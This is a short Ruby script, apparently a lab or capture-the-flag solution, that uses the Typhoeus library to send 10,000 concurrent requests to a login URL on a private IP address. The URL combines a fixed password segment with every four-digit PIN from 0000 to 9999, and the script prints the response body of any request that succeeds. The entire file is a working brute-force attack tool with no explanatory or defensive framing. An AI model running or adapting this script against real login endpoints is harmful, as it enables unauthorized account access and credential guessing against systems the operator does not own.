require 'typhoeus'

urls = (0..9999).map{ |num| "http://10.0.1.31/login/donutsAreGr8/#{'%04d' % num.to_s}"}

hydra = Typhoeus::Hydra.new(max_concurrency: 100)

urls.each do |url|
    request = Typhoeus::Request.new(url, timeout: 15000)
    request.on_complete do |response|
        if response.success?
            puts "Successfully requested " + url + response.body
        end
    end
    hydra.queue(request)
end

hydra.run